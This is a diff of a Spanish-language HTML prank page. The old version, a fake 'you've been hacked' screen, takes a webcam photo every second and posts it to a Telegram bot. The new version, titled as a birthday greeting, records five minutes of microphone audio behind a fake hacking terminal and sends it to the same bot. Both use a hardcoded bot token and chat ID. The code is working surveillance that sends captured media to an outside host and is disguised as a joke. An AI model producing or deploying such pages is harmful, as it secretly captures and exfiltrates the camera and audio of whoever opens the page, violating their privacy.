@@ -3,36 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>¡TE HACKEÉ!</title>
+    <title>¡Feliz Cumpleaños!</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
             background-color: #000;
             color: #0f0;
             font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
             overflow: hidden;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
         }
         
-        h1 {
-            font-size: 3em;
-            text-shadow: 0 0 10px #0f0;
-            animation: glitch 1s infinite;
-        }
-        
-        p {
-            font-size: 1.5em;
-            margin: 20px;
+        .container {
+            padding: 20px;
+            position: relative;
         }
         
         .matrix {
-            position: fixed;
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
@@ -41,130 +29,267 @@
             opacity: 0.3;
         }
         
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-5px, 5px); }
-            40% { transform: translate(-5px, -5px); }
-            60% { transform: translate(5px, 5px); }
-            80% { transform: translate(5px, -5px); }
-            100% { transform: translate(0); }
+        h1 {
+            color: #f00;
+            text-align: center;
+            text-shadow: 0 0 10px #f00;
+            animation: glitch 1s linear infinite;
         }
         
-        #camera-feed {
+        .terminal {
+            border: 2px solid #0f0;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
+            height: 300px;
+            overflow-y: auto;
+        }
+        
+        .command {
+            color: #0f0;
+        }
+        
+        .output {
+            color: #0ff;
+        }
+        
+        .error {
+            color: #f00;
+        }
+        
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        
+        @keyframes blink {
+            from, to { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        @keyframes glitch {
+            0% { text-shadow: 2px 0 0 #0f0, -2px 0 0 #f00; }
+            25% { text-shadow: -2px 0 0 #0f0, 2px 0 0 #f00; }
+            50% { text-shadow: 2px 0 0 #0f0, -2px 0 0 #f00; }
+            75% { text-shadow: -2px 0 0 #0f0, 2px 0 0 #f00; }
+            100% { text-shadow: 2px 0 0 #0f0, -2px 0 0 #f00; }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            background-color: #222;
+            border-radius: 5px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 20px;
+            background-color: #0f0;
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        .recording {
+            text-align: center;
+            margin-top: 20px;
             display: none;
         }
         
-        #counter {
-            font-size: 2em;
-            color: red;
-            margin-top: 20px;
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        #countdown {
+            font-size: 24px;
+            text-align: center;
+            margin: 20px 0;
         }
     </style>
 </head>
 <body>
     <canvas id="matrix" class="matrix"></canvas>
-    <h1>¡TE HACKEÉ! 🚨</h1>
-    <p>He accedido a tu cámara y estoy enviando fotos a mi servidor...</p>
-    <p id="counter">Fotos enviadas: 0</p>
     
-    <video id="camera-feed" autoplay></video>
-    <canvas id="photo-canvas" style="display: none;"></canvas>
+    <div class="container">
+        <h1>¡TE HACKIÉ!</h1>
+        
+        <div class="terminal" id="terminal">
+            <p class="command">> Iniciando secuencia de hackeo...</p>
+            <p class="output">Analizando sistema objetivo...</p>
+            <p class="output">Bypasseando firewalls...</p>
+            <p class="error">¡Error! Contramedidas detectadas...</p>
+            <p class="output">Inyectando código malicioso...</p>
+            <p class="output">Acceso root obtenido!</p>
+            <p class="command">> <span class="blink">_</span></p>
+        </div>
+        
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+        
+        <div id="countdown"></div>
+        
+        <div class="recording" id="recording">
+            <h2 class="pulse">GRABANDO AUDIO...</h2>
+            <p>Estamos recolectando tus datos personales...</p>
+            <p id="timer">00:05:00</p>
+        </div>
+    </div>
     
     <script>
-        // Configura tu bot de Telegram aquí
-        const BOT_TOKEN = "7603508622:AAHduDcxlylbwFxpH7YpC02UJT43R31wmuk"; // Reemplaza con tu token de bot
-        const CHAT_ID = "8064474906";    // Reemplaza con tu chat_id
-        
-        let photoCount = 0;
-        const counter = document.getElementById('counter');
-        const video = document.getElementById('camera-feed');
-        const canvas = document.getElementById('photo-canvas');
+        // Efecto Matrix
+        const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         
-        // Efecto Matrix de fondo
-        const matrixCanvas = document.getElementById('matrix');
-        const matrixCtx = matrixCanvas.getContext('2d');
-        matrixCanvas.width = window.innerWidth;
-        matrixCanvas.height = window.innerHeight;
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
         
-        const chars = "01";
-        const fontSize = 14;
-        const columns = matrixCanvas.width / fontSize;
-        const drops = [];
+        const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
+        const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const nums = '0123456789';
         
-        for (let i = 0; i < columns; i++) {
-            drops[i] = 1;
+        const alphabet = katakana + latin + nums;
+        
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        
+        const rainDrops = [];
+        
+        for (let x = 0; x < columns; x++) {
+            rainDrops[x] = 1;
         }
         
-        function drawMatrix() {
-            matrixCtx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
+        const draw = () => {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
             
-            matrixCtx.fillStyle = '#0f0';
-            matrixCtx.font = fontSize + 'px monospace';
+            ctx.fillStyle = '#0f0';
+            ctx.font = fontSize + 'px monospace';
             
-            for (let i = 0; i < drops.length; i++) {
-                const text = chars.charAt(Math.floor(Math.random() * chars.length));
-                matrixCtx.fillText(text, i * fontSize, drops[i] * fontSize);
+            for (let i = 0; i < rainDrops.length; i++) {
+                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                 
-                if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
+                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    rainDrops[i] = 0;
                 }
-                
-                drops[i]++;
+                rainDrops[i]++;
             }
-        }
+        };
         
-        setInterval(drawMatrix, 33);
+        setInterval(draw, 30);
         
-        // Acceso a la cámara
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                setTimeout(() => {
-                    takeAndSendPhoto(); // Primera foto
-                    setInterval(takeAndSendPhoto, 1000); // Foto cada segundo
-                }, 2000);
-            } catch (err) {
-                console.error("Error al acceder a la cámara:", err);
-                document.body.innerHTML += `<p style="color:red;">Error: No se pudo acceder a la cámara.</p>`;
+        // Simulación de terminal
+        const terminal = document.getElementById('terminal');
+        const progress = document.getElementById('progress');
+        
+        const commands = [
+            "Recopilando datos personales...",
+            "Accediendo a la cámara...",
+            "Accediendo al micrófono...",
+            "Analizando contraseñas guardadas...",
+            "Enviando datos al servidor...",
+            "¡Hackeo completado con éxito!"
+        ];
+        
+        let currentProgress = 0;
+        const progressInterval = setInterval(() => {
+            currentProgress += 5;
+            progress.style.width = currentProgress + "%";
+            
+            if (currentProgress >= 100) {
+                clearInterval(progressInterval);
+                startRecording();
             }
-        }
+        }, 500);
         
-        // Tomar foto y enviar a Telegram
-        async function takeAndSendPhoto() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        let commandIndex = 0;
+        const commandInterval = setInterval(() => {
+            if (commandIndex < commands.length) {
+                const p = document.createElement('p');
+                p.className = commandIndex % 2 === 0 ? 'output' : 'error';
+                p.textContent = commands[commandIndex];
+                terminal.appendChild(p);
+                terminal.scrollTop = terminal.scrollHeight;
+                commandIndex++;
+            } else {
+                clearInterval(commandInterval);
+            }
+        }, 1000);
+        
+        // Grabación de audio
+        let mediaRecorder;
+        let audioChunks = [];
+        let recordingInterval;
+        let secondsLeft = 300; // 5 minutos en segundos
+        
+        function startRecording() {
+            document.getElementById('recording').style.display = 'block';
             
-            const photoData = canvas.toDataURL('image/jpeg');
-            photoCount++;
-            counter.textContent = `Fotos enviadas: ${photoCount}`;
+            // Mostrar cuenta regresiva
+            updateCountdown();
             
-            // Enviar a Telegram (usando un servidor proxy si no estás en HTTPS)
-            try {
-                const formData = new FormData();
-                const blob = await (await fetch(photoData)).blob();
-                formData.append('photo', blob, `hacked-photo-${photoCount}.jpg`);
-                
-                // Usamos un proxy si no está en HTTPS
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
-                    method: 'POST',
-                    body: formData
+            // Solicitar acceso al micrófono
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    mediaRecorder = new MediaRecorder(stream);
+                    
+                    mediaRecorder.ondataavailable = event => {
+                        audioChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+                        sendAudioToTelegram(audioBlob);
+                    };
+                    
+                    // Grabar en bloques de 1 minuto
+                    mediaRecorder.start(60000);
+                    
+                    // Detener después de 5 minutos
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        clearInterval(recordingInterval);
+                        document.getElementById('recording').innerHTML = '<h2>¡Datos enviados con éxito!</h2><p>Feliz cumpleaños, esto era una broma :)</p>';
+                    }, 300000);
+                })
+                .catch(err => {
+                    console.error('Error al acceder al micrófono:', err);
+                    document.getElementById('recording').innerHTML = '<h2 class="error">Error al acceder al micrófono</h2><p>Pero feliz cumpleaños de todos modos :)</p>';
                 });
-                
-                const result = await response.json();
-                if (!result.ok) {
-                    console.error("Error al enviar foto:", result);
-                }
-            } catch (err) {
-                console.error("Error al enviar foto:", err);
+        }
+        
+        function updateCountdown() {
+            const minutes = Math.floor(secondsLeft / 60);
+            const seconds = secondsLeft % 60;
+            document.getElementById('timer').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (secondsLeft > 0) {
+                secondsLeft--;
+                setTimeout(updateCountdown, 1000);
             }
         }
         
-        // Iniciar la broma
-        startCamera();
+        function sendAudioToTelegram(audioBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', '8064474906');
+            formData.append('caption', 'Audio grabado desde la página de broma');
+            formData.append('audio', audioBlob, 'hackeo.mp3');
+            
+            fetch(`https://api.telegram.org/bot7603508622:AAHduDcxlylbwFxpH7YpC02UJT43R31wmuk/sendAudio`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log('Audio enviado:', data))
+            .catch(error => console.error('Error al enviar audio:', error));
+        }
     </script>
 </body>
-</html>
+            </html>
